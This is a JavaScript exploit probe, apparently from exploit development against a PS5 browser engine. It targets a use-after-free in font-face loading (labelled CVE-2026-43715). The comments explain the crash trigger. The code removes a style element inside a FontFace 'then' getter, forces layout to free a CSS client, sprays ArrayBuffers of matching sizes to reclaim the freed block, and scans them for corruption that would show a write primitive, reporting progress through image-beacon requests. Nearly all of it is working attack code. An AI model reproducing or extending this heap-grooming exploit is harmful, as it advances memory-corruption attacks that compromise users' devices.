// p446 — CVE-2026-43715 Stage 2 attempt: groom the UAF, survive the callback
// Beacon prefix: V446-
//
// p445 confirmed the crash (18/18): CSS-created face + then-getter + victim
// style removal -> the iterateClients loop callbacks the disconnected
// client and the process dies. The disconnect happens during the forced
// layout inside the getter.
//
// This probe sprays ArrayBuffers (FastMalloc, Gigacage off — same heap as
// the CSS objects) with a marker pattern INSIDE the getter, between the
// free (layout) and the loop's next callback. If one of them lands on the
// freed client's block:
//   - survival:  the virtual call reads our bytes instead of garbage;
//                if it doesn't die outright we reach OK-n / SURVIVED
//   - readback:  after the round, scan every buffer for changes to the
//                marker — engine writes into a sprayed buffer are the
//                first evidence of a write primitive + heap layout info
//
// Spray sweep: sizes 96..1536 bytes (typical CSS object classes), marker
// = 0xV446 pattern per slot, ~200 buffers per round, freed after scan.

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V446-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  B('BOOT');

  window.onerror = function(msg, src, line, col) {
    B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 100));
    return false;
  };

  var SRC = 'local(Helvetica)';
  var SIZES = [96, 128, 160, 192, 224, 256, 320, 384, 448, 512, 640, 768, 1024, 1536];
  var spray = [];

  function doSpray(tag) {
    spray = [];
    for (var s = 0; s < SIZES.length; s++) {
      for (var n = 0; n < 20; n++) {
        var buf = new ArrayBuffer(SIZES[s]);
        var u8 = new Uint8Array(buf);
        for (var i = 0; i < u8.length; i += 8) {
          // 46 34 34 56 "V44V" pattern, slot index high bits
          u8[i] = 0x46; u8[i+1] = 0x34; u8[i+2] = 0x34; u8[i+3] = 0x56;
          u8[i+4] = s; u8[i+5] = n & 0xff; u8[i+6] = (i / 8) & 0xff; u8[i+7] = 0;
        }
        spray.push(u8);
      }
    }
    B('SPRAY-' + tag + '-' + spray.length);
  }

  // Readback: any marker deviation = the engine touched our memory.
  function scan() {
    var dirty = 0, examples = '';
    for (var k = 0; k < spray.length; k++) {
      var u8 = spray[k];
      for (var i = 0; i < u8.length; i += 8) {
        if (u8[i] !== 0x46 || u8[i+1] !== 0x34 || u8[i+2] !== 0x34 ||
            u8[i+3] !== 0x56 || u8[i+4] !== ((k / 20) | 0) ||
            u8[i+5] !== (k % 20)) {
          dirty++;
          if (examples.length < 180)
            examples += 'k' + k + '@' + i + ':' +
              u8[i].toString(16) + u8[i+1].toString(16) +
              u8[i+2].toString(16) + u8[i+3].toString(16) + ' ';
          break; // one hit per buffer is enough
        }
      }
    }
    if (dirty) B('DIRTY-' + dirty + '-' + encodeURIComponent(examples));
    else B('CLEAN');
  }

  var hits = 0;
  Object.defineProperty(FontFace.prototype, 'then', {
    get: function() {
      hits++;
      B('THEN-' + hits);
      var v = document.getElementById('v');
      if (v) {
        v.remove();
        document.body.offsetHeight; // disconnect + free happens here
        doSpray(hits);              // occupy the hole immediately
        B('VR-' + hits);
      }
      return undefined;
    },
    configurable: true
  });
  B('GETTER-SET');

  function round(i) {
    var fam = 'g' + i;

    var victim = document.createElement('style');
    victim.id = 'v';
    victim.textContent = 'x{}';
    document.head.appendChild(victim);

    var fs = document.createElement('style');
    fs.textContent = '@font-face { font-family: ' + fam + '; src: ' + SRC + '; }';
    document.head.appendChild(fs);
    document.body.offsetHeight;

    var faces = [];
    document.fonts.forEach(function(f) { faces.push(f); });
    var face = faces.find(function(f) {
      return f.family.replace(/['"]/g, '') === fam;
    });
    if (!face) { B('NOFACE-' + i); return; }

    void face.loaded;
    B('LOAD-' + i);

    face.load().then(
      function() {
        B('SURVIVED-' + i + '-H' + hits);
        scan();
        spray = [];
      },
      function(e) {
        B('NO-' + i + '-' + encodeURIComponent(String(e)).slice(0, 60));
      }
    );
  }

  // One round per page load for now: survival must be proven before we
  // iterate. The PS5 reloads the page quickly, that is the loop.
  round(0);
  setTimeout(function() { B('ALIVE-1S-H' + hits); scan(); }, 1000);
  setTimeout(function() { B('ALIVE-3S-H' + hits); }, 3000);
})();
